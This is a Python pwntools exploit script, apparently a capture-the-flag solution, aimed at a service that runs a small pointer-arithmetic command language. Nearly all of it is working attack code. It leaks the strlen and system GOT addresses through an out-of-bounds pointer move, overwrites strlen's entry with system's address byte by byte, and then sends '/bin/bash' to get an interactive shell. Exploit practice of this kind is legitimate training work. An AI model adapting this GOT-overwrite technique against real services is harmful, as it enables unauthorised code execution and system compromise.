import argparse

from pwn import *


parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

r.sendlineafter(b':', b'x')
strlen_got_bytes = r.readuntil('Run another?', drop=True)

overwrite_offset = 31

read_program = b'd'*128 + b'd'*overwrite_offset + b'd?'*8

r.sendafter(b'(y/n)', b'y')
r.sendlineafter(b': \n', read_program)
strlen_got_bytes = r.readuntil('Run another?', drop=True)
print('strlen', strlen_got_bytes[::-1].hex())

strlen_addr = int.from_bytes(strlen_got_bytes, 'little')

# read system  from gotplt

read_system_program = b'd'*128 + b'd'*(overwrite_offset+8) + b'd?'*8

r.sendafter(b'(y/n)', b'y')
r.sendlineafter(b': \n', read_system_program)
system_addr_bytes = r.readuntil('Run another?', drop=True)
print('system', system_addr_bytes[::-1].hex())

r.sendafter(b'(y/n)', b'y')

write_program = b'd'*128 + b'd'*overwrite_offset

for i in range(0, 8):
    write_program += b'd'
    if strlen_got_bytes[i] < system_addr_bytes[i]:
        write_program += b'w'*(system_addr_bytes[i] - strlen_got_bytes[i])
    elif strlen_got_bytes[i] > system_addr_bytes[i]:
        write_program += b's'*(strlen_got_bytes[i] - system_addr_bytes[i])

r.sendlineafter(b': \n', write_program)
r.sendafter(b'(y/n)', b'y')

r.sendlineafter(b': \n', b'/bin/bash')
r.interactive()
